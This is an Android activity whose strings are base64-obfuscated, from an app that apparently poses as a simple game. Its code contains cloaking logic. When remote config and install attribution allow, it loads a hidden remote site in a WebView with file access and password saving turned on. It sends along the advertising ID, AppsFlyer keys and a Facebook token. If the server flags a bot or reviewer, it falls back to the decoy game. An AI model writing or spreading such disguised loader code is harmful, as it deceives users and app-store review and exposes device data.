package com.diccey.frykti;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TextView;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.omega_r.libs.OmegaCenterIconButton;
import com.onesignal.OneSignal;

import me.ibrahimsn.lib.CirclesLoadingView;

public class DF extends AppCompatActivity {

    OmegaCenterIconButton startgame, closegames, binter;
    TextView textInter;
    CirclesLoadingView progress;
    String nbhcx = "MTQyNjUxNDUtZTVlZC00MjMzLWJjNmQtYjI1MTYyMzllMTNi";
    String qwqwqsxsd;
    WebView webViewFullAppDF;
    public static DataDF dataDF;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.df);

        qwqwqsxsd = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(SetImg.decodeDF("c2F2ZWRVcmw="), SetImg.decodeDF("bnVsbA=="));
        startgame = findViewById(R.id.startgame);
        closegames = findViewById(R.id.closegames);
        progress = findViewById(R.id.progress);
        binter = findViewById(R.id.binter);
        textInter = findViewById(R.id.textInter);
        webViewFullAppDF = findViewById(R.id.webViewFullAppDF);
        setWebDF(this);
        Click.df = this;

        startgame.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(), MainActivity.class));
            }
        });

        closegames.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finishAffinity();
            }
        });

        binter.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(), DF.class));
                finishAffinity();
            }
        });

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(SetImg.decodeDF(nbhcx));

        boolean tr = Click.iush(this);


        if (tr) {

            if (qwqwqsxsd.equals(SetImg.decodeDF("bnVsbA=="))) {

                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            dataDF = MainActivity.connDf();
                            Log.d("weq", dataDF.getCxzc());
                            Log.d("weq", dataDF.getVcvcx());
                            Log.d("weq", dataDF.getBbvbv());
                            Log.d("weq", dataDF.getHghf());

                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    DataDF.dipp(DF.this);

                                    new CountDownTimer(20000, 1000) {

                                        @Override
                                        public void onTick(long l) {
                                            if (!AppliDF.jcyys.equals("-") || !DataDF.bchx.equals("-")) {
                                                cancel();
                                                startWeDF(dataDF.getVcvcx(), dataDF.getCxzc());
                                            } else {

                                            }
                                        }

                                        @Override
                                        public void onFinish() {
                                            startWeDF(dataDF.getVcvcx(), dataDF.getCxzc());
                                        }
                                    }.start();

                                }
                            });

                        } catch (Exception e) {
                        }
                    }
                }).start();

            } else {

                webViewFullAppDF.loadUrl(qwqwqsxsd);
            }


        } else {

            binter.setVisibility(View.VISIBLE);
            textInter.setVisibility(View.VISIBLE);
            progress.setVisibility(View.INVISIBLE);

        }

    }


    public ValueCallback<Uri> ugsha;
    public Uri nhsa = null;
    public ValueCallback<Uri[]> csca;
    public String vdda;
    public static final int vdawa = 1;

    public void setWebDF(DF df) {
        webViewFullAppDF.getSettings().setJavaScriptEnabled(true);
        webViewFullAppDF.getSettings().setAllowContentAccess(true);
        webViewFullAppDF.getSettings().setLoadWithOverviewMode(true);
        webViewFullAppDF.getSettings().setEnableSmoothTransition(true);
        webViewFullAppDF.getSettings().setUseWideViewPort(true);
        webViewFullAppDF.getSettings().setSaveFormData(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webViewFullAppDF, true);
        CookieManager.getInstance().setAcceptCookie(true);
        webViewFullAppDF.getSettings().setAllowFileAccessFromFileURLs(true);
        webViewFullAppDF.getSettings().setSavePassword(true);
        webViewFullAppDF.getSettings().setDatabaseEnabled(true);
        webViewFullAppDF.getSettings().setRenderPriority(android.webkit.WebSettings.RenderPriority.HIGH);
        webViewFullAppDF.getSettings().setCacheMode(android.webkit.WebSettings.LOAD_DEFAULT);
        webViewFullAppDF.getSettings().setAppCacheEnabled(true);
        webViewFullAppDF.getSettings().setLoadsImagesAutomatically(true);
        webViewFullAppDF.setSaveEnabled(true);
        webViewFullAppDF.getSettings().setMixedContentMode(0);
        webViewFullAppDF.setFocusable(true);
        webViewFullAppDF.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webViewFullAppDF.getSettings().setAllowFileAccess(true);
        webViewFullAppDF.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webViewFullAppDF.getSettings().setDomStorageEnabled(true);
        webViewFullAppDF.setFocusableInTouchMode(true);
        webViewFullAppDF.setWebViewClient(new WebViewClient() {

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                webViewFullAppDF.setVisibility(View.VISIBLE);
                if (url.contains(SetImg.decodeDF("ZXJyb3I9YXBwYWZBczNm")) || url.contains(SetImg.decodeDF("ZGlzYWJsZWQuaHRtbA=="))) {
                    webViewFullAppDF.setVisibility(View.INVISIBLE);
                    progress.setVisibility(View.INVISIBLE);
                    startgame.setVisibility(View.VISIBLE);
                    closegames.setVisibility(View.VISIBLE);
                    Log.d("weq","bot");

                }
            }
        });
        webViewFullAppDF.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onShowFileChooser(WebView view,
                                             ValueCallback<Uri[]> vdaw,
                                             FileChooserParams caaw) {
                if (csca != null) {
                    csca.onReceiveValue(null);
                }
                csca = vdaw;
                Intent hds = new Intent(Intent.ACTION_GET_CONTENT);
                hds.addCategory(Intent.CATEGORY_OPENABLE);
                hds.setType("*/*");
                Intent[] bcxzg = new Intent[0];
                Intent qwqwqa = new Intent(Intent.ACTION_CHOOSER);
                qwqwqa.putExtra(Intent.EXTRA_INTENT, hds);
                qwqwqa.putExtra(Intent.EXTRA_TITLE, SetImg.decodeDF("U2VsZWN0IE9wdGlvbjo="));
                qwqwqa.putExtra(Intent.EXTRA_INITIAL_INTENTS, bcxzg);
                df.startActivityForResult(qwqwqa, 1);
                return true;
            }
        });
    }

    @Override
    public void onBackPressed() {
        if (webViewFullAppDF.isFocused() && webViewFullAppDF.canGoBack()) {
            webViewFullAppDF.goBack();
        }
    }

    @Override
    protected void onActivityResult(int acac, int vaaw, @Nullable Intent bwaa) {
        if (acac != vdawa || csca == null) {
            super.onActivityResult(acac, vaaw, bwaa);
            return;
        }
        Uri[] vdaw = null;
        if (vaaw == Activity.RESULT_OK) {
            if (bwaa == null) {
                if (vdda != null) {
                    vdaw = new Uri[]{Uri.parse(vdda)};
                }
            } else {
                String dataString = bwaa.getDataString();
                if (dataString != null) {
                    vdaw = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        csca.onReceiveValue(vdaw);
        csca = null;
        if (ugsha == null) {
            super.onActivityResult(acac, vaaw, bwaa);
            return;
        }
        Uri ngah = null;
        try {
            if (vaaw != RESULT_OK) {
                ngah = null;
            } else {
                ngah = bwaa == null ? nhsa : bwaa.getData();
            }
        } catch (Exception e) {
        }
        ugsha.onReceiveValue(ngah);
        ugsha = null;
    }

    public void startWeDF(String czh, String kiuh) {

        if (AppliDF.jcyys.equals(SetImg.decodeDF("Tm9uLW9yZ2FuaWM="))) {
            String vz = czh + AppliDF.bvvcv;
            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(SetImg.decodeDF("c2F2ZWRVcmw="), vz).apply();
            webViewFullAppDF.loadUrl(vz);
            Log.d("weq","App" + vz);
        } else if (DataDF.bdga != null) {
            String vz = czh + DataDF.bchx;
            Log.d("weq","Dipp" + vz);
            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(SetImg.decodeDF("c2F2ZWRVcmw="), vz).apply();
            webViewFullAppDF.loadUrl(vz);

        } else {
            if (kiuh.equals("0")) {

                progress.setVisibility(View.INVISIBLE);
                startgame.setVisibility(View.VISIBLE);
                closegames.setVisibility(View.VISIBLE);
                Log.d("weq","gsme");
            } else {

               String vz = czh + SetImg.decodeDF("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
                        SetImg.decodeDF("Jmdvb2dsZV9hZGlkPQ==") + AppliDF.nhcfs +
                        SetImg.decodeDF("JmFmX3VzZXJpZD0=") + AppliDF.ubsj +
                        SetImg.decodeDF("JmRldl9rZXk9") + SetImg.decodeDF(AppliDF.zzzxz) +
                        SetImg.decodeDF("JmJ1bmRsZT0=") + getPackageName() +
                        SetImg.decodeDF("JmZiX2FwcF9pZD0=") + dataDF.getHghf()  +
                        SetImg.decodeDF("JmZiX2F0PQ==") + dataDF.getBbvbv();
                Log.d("weq","Organic" + vz);

                getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(SetImg.decodeDF("c2F2ZWRVcmw="), vz).apply();
                webViewFullAppDF.loadUrl(vz);

            }
        }
    }
}
